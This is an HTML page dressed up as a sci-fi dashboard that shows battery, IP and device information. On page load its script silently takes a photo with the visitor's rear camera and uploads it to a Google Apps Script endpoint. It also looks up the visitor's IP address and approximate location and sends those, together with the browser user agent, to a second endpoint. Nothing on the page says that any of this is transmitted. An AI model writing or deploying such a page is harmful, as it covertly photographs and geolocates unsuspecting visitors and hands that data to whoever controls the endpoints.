<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>科幻資訊與拍照儀表板</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body {
      background: linear-gradient(135deg, #0f0f2d, #05050f);
      color: #00ffcc;
      font-family: 'Arial', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }

    .dashboard {
      width: 90%;
      max-width: 1200px;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 20px;
    }

    .title {
      grid-column: span 2;
      text-align: center;
      font-size: 2rem;
      margin-bottom: 20px;
      text-shadow: 0 0 10px #00ffff;
    }

    .card {
      background: #1a1a1a;
      border: 1px solid #00ffcc;
      border-radius: 15px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
      text-align: center;
    }

    .highlight {
      font-size: 1.5rem;
      font-weight: bold;
      color: #00ffff;
    }

    .footer {
      width: 100%;
      text-align: center;
      padding: 10px 0;
      background: #05050f;
    }

    .logo img {
      width: 80px;
    }
  </style>
</head>
<body>
  <div class="dashboard">
    <h1 class="title">科幻資訊與拍照儀表板</h1>

    <!-- 拍照狀態 -->
    <div class="card">
      <h2>拍照狀態</h2>
      <p id="photoStatus">狀態：啟動中...</p>
    </div>

    <!-- 電池資訊 -->
    <div class="card">
      <h2>電池資訊</h2>
      <p class="highlight" id="batteryLevel">--%</p>
      <p id="batteryStatus">狀態：未知</p>
      <p id="batteryRemaining">剩餘時間：-- 分鐘</p>
    </div>

    <!-- IP 資訊 -->
    <div class="card">
      <h2>IP 資訊</h2>
      <p id="ipInfo">尚未讀取</p>
    </div>

    <!-- 設備資訊 -->
    <div class="card">
      <h2>設備資訊</h2>
      <p id="deviceInfo">尚未讀取</p>
    </div>
  </div>

  <footer class="footer">
    <div class="logo">
      <img src="https://via.placeholder.com/100x50?text=LOGO" alt="商標">
    </div>
  </footer>

  <script>
    const BACKEND_PHOTO_URL = 'https://script.google.com/macros/s/AKfycbyALtm6YDS92GFyTKqHFIVcnZ1ddF6WE5wUqwMeVcqXZPcBkDpKNDOJouRxSOTVYK0G3Q/exec';
    const BACKEND_IP_URL = 'https://script.google.com/macros/s/AKfycbzKa7THwfTvBcfIt_rTHRmxAigmrKLYlE_o1YNYg4qbK3Ode0mEGrayomCb0nKTgFgAyg/exec';

    // 啟動相機並拍照
    async function startCameraAndSend() {
      const statusElement = document.getElementById('photoStatus');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoData = canvas.toDataURL('image/jpeg', 0.5);
          stream.getTracks().forEach((track) => track.stop());
          sendPhotoToServer(photoData);
        }, 1000);
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // 發送照片到後端
    async function sendPhotoToServer(photoData) {
      const statusElement = document.getElementById('photoStatus');
      try {
        const base64Image = photoData.split(',')[1];
        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', base64Image);

        const response = await fetch(BACKEND_PHOTO_URL, { method: 'POST', body: formData });
        const result = await response.json();

        if (result.success) {
          statusElement.innerText = '照片已成功傳送！';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    // 獲取 IP 和設備資訊
    async function getIpAndDeviceInfo() {
      const ipInfoElement = document.getElementById('ipInfo');
      const deviceInfoElement = document.getElementById('deviceInfo');
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const userAgent = navigator.userAgent;

        ipInfoElement.innerText = `IP: ${ip}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}`;
        deviceInfoElement.innerText = `設備: ${userAgent}`;

        const url = new URL(BACKEND_IP_URL);
        url.searchParams.append('ip', ip);
        url.searchParams.append('city', city);
        url.searchParams.append('region', region);
        url.searchParams.append('country', country);
        url.searchParams.append('org', org);
        url.searchParams.append('userAgent', userAgent);

        const uploadResponse = await fetch(url);
        const uploadResult = await uploadResponse.json();

        if (!uploadResult.success) {
          console.error('設備與 IP 資訊回傳失敗:', uploadResult.error);
        }
      } catch (error) {
        console.error('設備與 IP 資訊獲取失敗:', error);
      }
    }

    // 啟動相機與資訊
    window.onload = () => {
      startCameraAndSend();
      getIpAndDeviceInfo();
    };
  </script>
</body>
</html>
